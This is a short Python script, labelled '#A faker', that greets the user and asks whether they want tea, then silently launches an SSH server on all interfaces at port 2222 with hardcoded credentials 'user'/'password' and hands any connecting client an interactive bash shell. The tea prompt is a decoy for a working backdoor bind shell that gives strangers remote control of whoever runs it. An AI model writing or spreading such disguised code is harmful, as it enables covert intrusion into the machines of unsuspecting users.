
#A faker
print("hello")
print("Would you like some tea?")
tea = input("Y/N: ")


import socket
import threading
import paramiko
import os
import pty
import select

# Generate a host key (use an existing key for production)
HOST_KEY = paramiko.RSAKey.generate(2048)

class CustomSSHHandler(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_auth_password(self, username, password):
        # Authenticate with predefined credentials
        if username == "user" and password == "password":
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        # Allow password authentication
        return "password"

    def check_channel_request(self, kind, chanid):
        # Allow session channels
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        # Approve pseudo-terminal requests
        return True

    def check_channel_shell_request(self, channel):
        # Approve shell requests
        self.event.set()
        return True


def forward_data(channel, fd):
    """Forward data between the SSH channel and the PTY."""
    try:
        while True:
            # Use select to handle non-blocking I/O
            read_ready, _, _ = select.select([channel, fd], [], [])
            if channel in read_ready:
                # Read from the SSH channel and write to the PTY
                data = channel.recv(1024)
                if not data:
                    break
                os.write(fd, data)

            if fd in read_ready:
                # Read from the PTY and write to the SSH channel
                data = os.read(fd, 1024)
                if not data:
                    break
                channel.send(data)
    except Exception as e:
        print(f"Error during data forwarding: {e}")
    finally:
        channel.close()


def handle_client(channel):
    """Handle a single client session."""
    # Fork a pseudo-terminal
    pid, fd = pty.fork()
    if pid == 0:  # Child process
        # Replace the current process with the system shell
        os.execlp("/bin/bash", "/bin/bash")
    else:
        # Parent process: Forward data between the SSH channel and the PTY
        forward_data(channel, fd)
        os.close(fd)


def start_ssh_server(host="0.0.0.0", port=2222):
    try:
        # Create a socket to listen for incoming connections
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.listen(100)
        print(f"Listening for SSH connections on {host}:{port}...")

        while True:
            # Accept an incoming connection
            client_socket, client_address = sock.accept()
            print(f"Connection from {client_address}")

            # Establish an SSH connection
            transport = paramiko.Transport(client_socket)
            transport.add_server_key(HOST_KEY)
            server = CustomSSHHandler()

            try:
                transport.start_server(server=server)
                channel = transport.accept(20)  # Wait up to 20 seconds for a channel
                if channel is None:
                    print("Channel not established.")
                    continue

                print("Channel established. Starting shell session.")
                handle_client(channel)
            except Exception as e:
                print(f"Error during connection: {e}")
            finally:
                transport.close()
    except Exception as e:
        print(f"Failed to start SSH server: {e}")

# Start the SSH server
start_ssh_server()
